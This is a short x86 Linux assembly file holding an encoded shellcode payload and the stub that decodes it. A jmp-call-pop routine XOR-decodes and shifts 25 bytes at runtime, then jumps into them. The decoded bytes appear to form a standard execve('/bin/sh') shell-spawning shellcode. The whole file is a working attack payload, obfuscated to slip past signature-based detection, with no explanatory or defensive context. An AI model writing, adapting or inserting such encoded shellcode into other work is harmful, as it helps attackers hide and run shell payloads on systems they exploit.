global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl,25

decode:
	xor byte[esi], 0xba
	sub byte[esi], 0x3
	inc esi
	loop decode
	jmp short Shellcode

call_decoder:
	call decoder
	Shellcode: db 0x8e,0x79,0xe9,0xd1,0xcb,0x88,0xcc,0xd1,0xd1,0x88,0x88,0xdf,0xd6,0x36,0x5c,0xe9,0x36,0x5f,0xec,0x36,0x5e,0x09,0xb4,0x6a,0x39
